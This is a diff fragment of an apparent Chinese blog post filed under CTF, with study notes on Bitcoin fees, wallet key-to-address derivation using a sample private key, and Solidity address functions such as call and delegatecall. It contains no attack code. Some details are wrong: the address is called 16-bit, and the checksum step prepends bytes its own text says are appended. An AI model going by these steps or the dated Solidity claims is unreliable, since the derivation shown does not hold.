+<h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p>
+<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
+<h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p>
+<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
+<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
+<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
+<p>贴一条其他师傅的说明过程。</p>
+<p>第一步：生成随机私钥</p>
+<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
+<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
+<p>第二步：椭圆曲线算公钥</p>
+<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
+<p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
+<p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
+<p>第三步：计算公钥的SHA-256哈希值</p>
+<p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
+<p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
+<p>第四步：计算 RIPEMD-160哈希值</p>
+<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
+<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
+<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
+<p>取上一步结果，在前面加上16进制的00，即：</p>
+<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
+<p>第六步：计算 SHA-256 哈希值</p>
+<p>取上一步结果，进行SHA-256计算，可得：</p>
+<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
+<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
+<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
+<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
+<p>869ac57b</p>
+<p>第八步：把这4个字节加在第五步的结果后面</p>
+<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
+<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
+<p>第九步：用Base58编码变换一下地址</p>
+<p>对上一步的结果进行Base58编码，得到：</p>
+<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
+<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
+<h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
+<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p>
+<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>
+
+
+
+<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p>
+<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
+<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
+<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
+<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>
+
+<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>
+
+<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
+<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>
+
+<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
+<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
+<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>
+
+<p>发布低级别的调用</p>
+<p>call()下有两个控制交易的内置函数</p>
+<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
+<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>
+
+
+
+<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>
+
+<p>发布低级别的调用，没call好用，不久就会被删除了</p>
+<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>
+
+<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
+<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
+<blockquote>
+<p>[!WARNING]</p>
+<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
+</blockquote>
+<blockquote>
+<p>地址常量</p>
+</blockquote>
+<p>​	</p>
+<h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
+<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
+<p>可以通过索引访问以及[变量名].length返回字节长度</p>
+<p>可变长度的数组：</p>
+<p>①bytes(与array性质相同)</p>
+<p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>智能合约</tag>
       </tags>
   </entry>
   <entry>
